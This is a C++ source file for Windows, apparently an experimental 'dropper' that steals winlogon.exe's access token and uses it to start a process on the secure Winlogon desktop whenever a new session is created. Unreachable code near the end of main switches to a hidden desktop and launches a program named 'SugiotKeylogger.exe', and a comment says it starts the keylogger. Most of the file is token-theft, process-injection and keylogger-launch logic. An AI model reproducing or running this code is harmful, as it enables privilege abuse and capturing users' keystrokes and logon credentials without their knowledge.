// DropperTest.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#include <iostream>
#include <string>
#include <windows.h>
#include <tchar.h>
#include <wtsapi32.h>
#include <codecvt>
#include <windows.h>
#pragma comment(lib, "Wtsapi32.lib")
using namespace std;
wstring exePath = L"C:\\Users\\2014y\\Desktop\\AdvanceLogger\\x64\\Debug\\Runner.exe";
WCHAR logOnName[] = L"Winlogon";
WCHAR defualtDesktop[] = L"Default";

BOOL StartProcessOnWinlogonDesktop(const wstring& processName, PWSTR deskTopName);
BOOL TakeWinLogonToken(DWORD sessionID);

BOOL StartProcessWithToken(HANDLE hToken, LPCWSTR processPath, LPWSTR desktopName) {
	std::wstring commandLine = processPath;
	std::wcout << L"Starting process with " << commandLine << std::endl;
	HANDLE hTokenDup = NULL;
	if (DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityIdentification, TokenPrimary, &hTokenDup)) {
		STARTUPINFOW si = { sizeof(si) };
		PROCESS_INFORMATION pi = { 0 };
		si.lpDesktop = desktopName;
		if (CreateProcessAsUserW(
			hToken,
			NULL,
			&commandLine[0],
			NULL,
			NULL,
			FALSE,
			CREATE_NEW_CONSOLE | CREATE_UNICODE_ENVIRONMENT,
			NULL,
			NULL,
			&si,
			&pi)) {
			CloseHandle(pi.hProcess);
			CloseHandle(pi.hThread);
			return TRUE;
		}
		else {
			std::wcerr << L"Failed to create process: " << GetLastError() << std::endl;
			return FALSE;
		}
		CloseHandle(hTokenDup);
	}
	else {
		std::wcerr << L"Failed to duplicate token: " << GetLastError() << std::endl;
		return FALSE;
	}
}
void StartProcessInSession(DWORD sessionId, const std::wstring& processPath, LPWSTR desktopName) {
	HANDLE hToken = NULL;
	if (WTSQueryUserToken(sessionId, &hToken)) {
		HANDLE hTokenDup = NULL;
		if(StartProcessWithToken(hToken, processPath.c_str(), desktopName)) {
			cout << "Process started successfully on the Winlogon desktop." << endl;
		}
		else {
			cerr << "Failed to start process on the Winlogon desktop." << endl;
		}
		CloseHandle(hToken);
	}
	else {
		std::wcerr << L"Failed to query user token: " << GetLastError() << std::endl;
	}
}

BOOL createProcessInDesktop(LPWSTR desktopName, const wstring& execPath) {
	STARTUPINFO si;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	//copy desktopName in si.Deskdfv123top
	si.lpDesktop = desktopName;
	PROCESS_INFORMATION pi;
	ZeroMemory(&pi, sizeof(pi));

	if (!CreateProcess(
		execPath.c_str(),  // The path to the executable
		NULL,            // Command line arguments
		NULL,            // Process handle not inheritable
		NULL,            // Thread handle not inheritable
		FALSE,           // Set handle inheritance to FALSE
		CREATE_NO_WINDOW, // Creation flags
		NULL,            // Use parent's environment block
		NULL,            // Use parent's starting directory 
		&si,             // Pointer to STARTUPINFO structure
		&pi)             // Pointer to PROCESS_INFORMATION structure
		) {
		std::cerr << "CreateProcess failed (" << GetLastError() << ").\n";
		return TRUE;
	}
	else {
		std::cout << "Process started with PID " << pi.dwProcessId << "\n";
		return FALSE;
	}
}

BOOL CALLBACK EnumDesktopProc(LPWSTR lpszDesktop, LPARAM lparam) {
	wcout << L"Desktop: " << lpszDesktop << endl;
	/*
	if (StartProcessOnWinlogonDesktop(exePath, lpszDesktop)) {
		cout << "Process started successfully on the Winlogon desktop." << endl;
	}
	else {
		cerr << "Failed to start process on the Winlogon desktop." << endl;
	}
	*/
	return TRUE;
}

BOOL enumerateDesktopsInWindowStation(const wstring& windowStationName) {
	HWINSTA hwinsta = OpenWindowStation(windowStationName.c_str(), FALSE, WINSTA_ENUMDESKTOPS);
	if (hwinsta == NULL) {
		cerr << "FAILED to open window station. Error: " << GetLastError() << endl;
		return FALSE;
	}

	if (!EnumDesktops(hwinsta, EnumDesktopProc, 0)) {
		cerr << "FAILED to enumerate desktops in window station. Error: " << GetLastError() << endl;
		CloseWindowStation(hwinsta);
		return FALSE;
	}

	CloseWindowStation(hwinsta);
	return TRUE;
}

BOOL CALLBACK EnumWindowStationProc(LPWSTR lpszWindowStation, LPARAM lParam) {
	wcout << L"Window Station " << lpszWindowStation << endl;
	enumerateDesktopsInWindowStation(lpszWindowStation);
	return TRUE;
}

BOOL EnumerateWindowStations() {
	if (!EnumWindowStations(EnumWindowStationProc, 0)) {
		cerr << "FAILED to enumerate window stations" << endl;
		return FALSE;
	}
	return TRUE;
}


void EnumerateSessions() {
	DWORD dwSessionCount = 0;
	DWORD dwSessionArraySize = 0;
	PWTS_SESSION_INFO pSessionInfo = NULL;
	if (WTSEnumerateSessions(WTS_CURRENT_SERVER_HANDLE, 0, 1, &pSessionInfo, &dwSessionCount) && dwSessionCount > 1) {
		cout << "SessionID\tSession State\tUser Name" << endl;
		for (DWORD i = 0; i < dwSessionCount; i++) {
			DWORD sessionId = pSessionInfo[i].SessionId;
			WTS_CONNECTSTATE_CLASS state = pSessionInfo[i].State;

			LPWSTR userName = NULL;
			DWORD dwBytes = 0;
			if (WTSQuerySessionInformation(WTS_CURRENT_SERVER_HANDLE, sessionId, WTSUserName, &userName, &dwBytes)) {
				wcout << sessionId << "\t\t" << state << "\t\t" << userName << endl;
				WTSFreeMemory(userName);
			}
			else {
				wcout << sessionId << "\t\t" << state << "\t\t" << L"NA" << endl;

			}
		}
		WTSFreeMemory(pSessionInfo);
	}

}

void EnumerateAllProccessesInSession(DWORD sessionID) {
	PWTS_PROCESS_INFO pProcessInfo = NULL;
	DWORD dwProcessCount = 0;
	if (WTSEnumerateProcesses(WTS_CURRENT_SERVER_HANDLE, 0, 1, &pProcessInfo, &dwProcessCount)) {
		cout << "Process ID\tProcess Name" << endl;
		for (DWORD i = 0; i < dwProcessCount; i++) {
			DWORD processId = pProcessInfo[i].ProcessId;
			LPWSTR processName = pProcessInfo[i].pProcessName;
			if (pProcessInfo[i].SessionId == sessionID) {
				wcout << processId << "\t\t" << processName << endl;
			}
		}
		WTSFreeMemory(pProcessInfo);
	}
	else
	{
		wcout << L"Failed to enumerate processes in session " << sessionID << endl;
	}
}
BOOL TakeWinLogonToken(DWORD sessionID) {
	PWTS_PROCESS_INFO pProcessInfo = NULL;
	DWORD dwProcessCount = 0;
	if (WTSEnumerateProcesses(WTS_CURRENT_SERVER_HANDLE, 0, 1, &pProcessInfo, &dwProcessCount)) {
		cout << "Process ID\tProcess Name" << endl;
		for (DWORD i = 0; i < dwProcessCount; i++) {
			DWORD processId = pProcessInfo[i].ProcessId;
			std::wstring processName = pProcessInfo[i].pProcessName;
			if (pProcessInfo[i].SessionId == sessionID) {
				if (processName == L"winlogon.exe") {
					wcout << processId << "\t\t" << processName << endl;
					HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processId);
					if (!hProcess) {
						wcout << L"Failed to open process " << processId << endl;
						return FALSE;
					}
					HANDLE hToken;
					if (!OpenProcessToken(hProcess, TOKEN_READ | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, &hToken)) {
						wcout << L"Failed to open process token " << processId << endl;
						CloseHandle(hProcess);
						return FALSE;
					}
					DWORD sessionId;
					DWORD sessionInfoSize;
					if (GetTokenInformation(hToken, TokenSessionId, &sessionId, sizeof(sessionId), &sessionInfoSize)) {
						// Only proceed if session ID is not zero (session 0 is reserved for system processes)
						if (sessionId != 0) {
							std::wcout << L"Found WinLogon process in session " << sessionId << std::endl;
							// Start a process with the stolen token
							if (!StartProcessWithToken(hToken, exePath.c_str(), logOnName)) {
								std::wcerr << L"Failed to start process with token." << std::endl;
								return FALSE;
							}
							return TRUE;
						}
					}
					CloseHandle(hToken);
				}
			}

		}
		WTSFreeMemory(pProcessInfo);
	}
	else
	{
		wcout << L"Failed to enumerate processes in session " << sessionID << endl;
		return FALSE;
	}
	return TRUE;
}
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
	switch (uMsg) {
	case WM_WTSSESSION_CHANGE: {
		DWORD sessionId = static_cast<DWORD>(lParam);
		switch (wParam) {
		case WTS_CONSOLE_CONNECT:
			std::cout << "Console connect: Session ID " << sessionId << std::endl;
			//StartProcessInSession(sessionId, exePath, logOnName);
			//EnumerateAllProccessesInSession(sessionId);
			break;
		case WTS_CONSOLE_DISCONNECT:
			std::cout << "Console disconnect: Session ID " << sessionId << std::endl;
			break;
		case WTS_REMOTE_CONNECT:
			//EnumerateAllProccessesInSession(sessionId);
			std::cout << "Remote connect: Session ID " << sessionId << std::endl;
			break;
		case WTS_REMOTE_DISCONNECT:
			std::cout << "Remote disconnect: Session ID " << sessionId << std::endl;
			break;
		case WTS_SESSION_LOGON:
			std::cout << "Session logon: Session ID " << sessionId << std::endl;
			break;
		case WTS_SESSION_LOGOFF:
			std::cout << "Session logoff: Session ID " << sessionId << std::endl;
			break;
		case WTS_SESSION_LOCK:
			std::cout << "Session lock: Session ID " << sessionId << std::endl;
			//EnumerateSessions();
			break;
		case WTS_SESSION_UNLOCK:
			std::cout << "Session unlock: Session ID " << sessionId << std::endl;
			break;
		case WTS_SESSION_CREATE:
			std::cout << "Session create: Session ID " << sessionId << std::endl;
			TakeWinLogonToken(sessionId);
			break;
		case WTS_SESSION_TERMINATE:
			std::cout << "Session terminate: Session ID " << sessionId << std::endl;
			break;
		}
		break;
	}
	case WM_DESTROY:
		PostQuitMessage(0);
		break;
	default:
		return DefWindowProc(hwnd, uMsg, wParam, lParam);
	}
	return 0;
}

BOOL notifySessionsChanges() {
	wchar_t CLASS_NAME[] = L"Sample Window Class";
	WNDCLASS wc = {};
	wc.lpfnWndProc = WindowProc;
	wc.hInstance = GetModuleHandle(NULL);
	wc.lpszClassName = CLASS_NAME;

	RegisterClass(&wc);

	HWND hwnd = CreateWindowEx(
		0,
		CLASS_NAME,
		L"SAMPLE",
		0,
		CW_DEFAULT,
		CW_DEFAULT,
		CW_DEFAULT,
		CW_DEFAULT,
		NULL,
		NULL,
		GetModuleHandle(NULL),
		NULL
	);
	if (hwnd == NULL) {
		cerr << "FAILED to create window do monitor sessions" << endl;
		return FALSE;
	}
	if (!WTSRegisterSessionNotification(hwnd, NOTIFY_FOR_ALL_SESSIONS)) {
		cerr << "FAILRD register fot session notyfication" << endl;
		return FALSE;
	}
	MSG msg = {};
	while (GetMessage(&msg,NULL,0,0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	WTSUnRegisterSessionNotification(hwnd);
	return TRUE;
}
// Window procedure function
LRESULT CALLBACK WindowProc1(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
	switch (uMsg) {
	case WM_DESTROY:
		PostQuitMessage(0);
		return 0;

	case WM_PAINT:
	{
		PAINTSTRUCT ps;
		HDC hdc = BeginPaint(hwnd, &ps);

		FillRect(hdc, &ps.rcPaint, (HBRUSH)(COLOR_WINDOW + 1));

		EndPaint(hwnd, &ps);
	}
	return 0;

	case WM_COMMAND:
		if (LOWORD(wParam) == 1) {
			DestroyWindow(hwnd);
		}
		return 0;

	case WM_CLOSE:
		if (MessageBox(hwnd, L"Really quit?", L"My application", MB_OKCANCEL) == IDOK) {
			DestroyWindow(hwnd);
		}
		return 0;
	}
	return DefWindowProc(hwnd, uMsg, wParam, lParam);
}
HANDLE hThread;
DWORD CreateAndOpenWindowInNewDesktop(LPCWSTR desktopName) {
	// Create a new desktop
	HDESK hDesktop = CreateDesktop(desktopName, NULL, NULL, 0, GENERIC_ALL, NULL);
	if (hDesktop == NULL) {
		cout << "CreateDesktop failed with error " << GetLastError() << endl;
		return NULL;
	}

	// Switch to the new desktop
	if (!SwitchDesktop(hDesktop)) {
		cout << "SwitchDesktop failed with error " << GetLastError() << endl;
		return NULL;
	}

	// Create a thread to run the message loop on the new desktop
	DWORD dwThreadId;
	hThread = CreateThread(
		NULL, 0, [](LPVOID lpParam) -> DWORD {
			HDESK hDesktop = static_cast<HDESK>(lpParam);
			SetThreadDesktop(hDesktop);
			const wchar_t CLASS_NAME[] = L"Sample Window Class";

			WNDCLASS wc = {};
			wc.lpfnWndProc = WindowProc1;
			wc.hInstance = GetModuleHandle(NULL);
			wc.lpszClassName = CLASS_NAME;

			RegisterClass(&wc);

			HWND hwnd = CreateWindowEx(
				0,                              // Optional window styles
				CLASS_NAME,                     // Window class
				L"Learn to Program Windows",    // Window text
				WS_OVERLAPPEDWINDOW,            // Window style

				// Size and position
				CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT,

				NULL,       // Parent window
				NULL,       // Menu
				GetModuleHandle(NULL),  // Instance handle
				NULL        // Additional application data
			);

			if (hwnd == NULL) {
				return 0;
			}

			ShowWindow(hwnd, SW_SHOWDEFAULT);

			// Create a button
			HWND hButton = CreateWindow(
				L"BUTTON",  // Predefined class; Unicode assumed
				L"Close",      // Button text
				WS_TABSTOP | WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON,  // Styles
				10,         // x position
				10,         // y position
				100,        // Button width
				30,        // Button height
				hwnd,     // Parent window
				(HMENU)1,       // No menu
				(HINSTANCE)GetWindowLongPtr(hwnd, GWLP_HINSTANCE),
				NULL);      // Pointer not needed

			// Run the message loop
			MSG msg = {};
			while (GetMessage(&msg, NULL, 0, 0)) {
				TranslateMessage(&msg);
				DispatchMessage(&msg);
			}

			return 0;
		},
		hDesktop, 0, &dwThreadId
	);


	
	return dwThreadId;
}


BOOL SetPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege, BOOL bEnablePrivilege) {
	TOKEN_PRIVILEGES tp;
	LUID luid;

	if (!LookupPrivilegeValue(NULL, lpszPrivilege, &luid)) {
		cerr << "LookupPrivilegeValue error: " << GetLastError() << endl;
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = (bEnablePrivilege) ? SE_PRIVILEGE_ENABLED : 0;

	if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
		cerr << "AdjustTokenPrivileges error: " << GetLastError() << endl;
		return FALSE;
	}

	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
		cerr << "The token does not have the specified privilege." << endl;
		return FALSE;
	}

	return TRUE;
}

BOOL StartProcessOnWinlogonDesktop(const wstring& processName, PWSTR deskTopName) {
	// Open a handle to the current process token
	HANDLE hToken;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
		cerr << "Failed to open process token. Error: " << GetLastError() << endl;
		return FALSE;
	}

	// Enable the SE_ASSIGNPRIMARYTOKEN_NAME and SE_INCREASE_QUOTA_NAME privileges
	if (!SetPrivilege(hToken, SE_ASSIGNPRIMARYTOKEN_NAME, TRUE) ||
		!SetPrivilege(hToken, SE_INCREASE_QUOTA_NAME, TRUE)) {
		CloseHandle(hToken);
		return FALSE;
	}

	// Open the Winlogon desktop
	HDESK hDesk = OpenDesktop(deskTopName, 0, FALSE, GENERIC_ALL);
	if (hDesk == NULL) {
		cerr << "Failed to open Winlogon desktop. Error: " << GetLastError() << endl;
		CloseHandle(hToken);
		return FALSE;
	}

	// Set the desktop to Winlogon
	if (!SetThreadDesktop(hDesk)) {
		cerr << "Failed to set thread desktop. Error: " << GetLastError() << endl;
		CloseDesktop(hDesk);
		CloseHandle(hToken);
		return FALSE;
	}

	// Prepare to start the process
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	WCHAR logOnName[] = L"Winlogon";

	si.lpDesktop = logOnName;

	ZeroMemory(&pi, sizeof(pi));

	// Create the process on the Winlogon desktop
	if (!CreateProcess(NULL, const_cast<LPWSTR>(processName.c_str()), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
		cerr << "Failed to create process. Error: " << GetLastError() << endl;
		CloseDesktop(hDesk);
		CloseHandle(hToken);
		return FALSE;
	}

	// Cleanup
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	CloseDesktop(hDesk);
	CloseHandle(hToken);

	return TRUE;
}
BOOL IsProcessRunningInSession(DWORD sessionId, const std::wstring& processName) {
	// Get the list of processes running on the system
	PWTS_PROCESS_INFO pProcessInfo;
	DWORD processCount;

	if (WTSEnumerateProcesses(WTS_CURRENT_SERVER_HANDLE, 0, 1, &pProcessInfo, &processCount)) {
		for (DWORD i = 0; i < processCount; ++i) {
			// Check if the process belongs to the specified session
			if (pProcessInfo[i].SessionId == sessionId) {
				// Compare the process name
				if (processName.compare(pProcessInfo[i].pProcessName) == 0) {
					WTSFreeMemory(pProcessInfo);
					return TRUE;
				}
			}
		}
		WTSFreeMemory(pProcessInfo);
	}
	return FALSE;
}
std::wstring GetExeName(const std::wstring& exePath) {
	// Find the last occurrence of the backslash character
	size_t lastBackslash = exePath.find_last_of(L"\\");

	if (lastBackslash != std::wstring::npos) {
		// Return the substring after the last backslash
		return exePath.substr(lastBackslash + 1);
	}
	else {
		// If no backslash is found, return the entire string
		return exePath;
	}
}
int main()
{
	std::wstring path1 = L"C:\\Debug\\runner.exe";
	std::wstring path2 = L"runner.exe";

	std::wcout << L"Executable name from path1: " << GetExeName(path1) << std::endl;
	std::wcout << L"Executable name from path2: " << GetExeName(path2) << std::endl;

	return 0;
	StartProcessInSession(1, exePath + L" OUT.txt", defualtDesktop);
	cout << "Enumerate in WinSta0" << endl;
	return 0;
	enumerateDesktopsInWindowStation(L"WinSta0");
	L"winsta0";
	L"default";
	DWORD sessionId = WTSGetActiveConsoleSessionId();
	if (sessionId == 0xFFFFFFFF) {
		std::cerr << "No active console session found" << std::endl;
		return 1;
	}

	std::wcout << L"Active console session ID: " << sessionId << std::endl;
	StartProcessInSession(sessionId,exePath, defualtDesktop);
	StartProcessInSession(sessionId, exePath, logOnName);
	notifySessionsChanges();
	return 0;
	EnumerateSessions();
	notifySessionsChanges();
	return 0;
	enumerateDesktopsInWindowStation(L"WinSta0");
	return 0;
	EnumerateWindowStations();

	

	//createProcessInDesktop(logOnName, exePath);
	/*
	if (StartProcessOnWinlogonDesktop(exePath)) {
		cout << "Process started successfully on the Winlogon desktop." << endl;
	}
	else {
		cerr << "Failed to start process on the Winlogon desktop." << endl;
	}
	*/
	//createProcessInDesktop(logOnName, exePath);

	return 0;
	
	//notifySessionsChanges();
	CreateAndOpenWindowInNewDesktop(L"NewDesktop");
	// Wait for the thread to finish


	if (hThread == NULL) {
		cout << "CreateThread failed with error " << GetLastError() << endl;
		return 1;
	}

	//EnumerateSessions();

	//start the keylogger on the desktop
	WCHAR desktopName[] = L"NewDesktop";

	wstring exePath = L"C:\\Users\\2014y\\Desktop\\AdvanceLogger\\x64\\Debug\\SugiotKeylogger.exe";
	createProcessInDesktop(desktopName, exePath);




	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
	return 0;






}

// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
// Debug program: F5 or Debug > Start Debugging menu

// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file
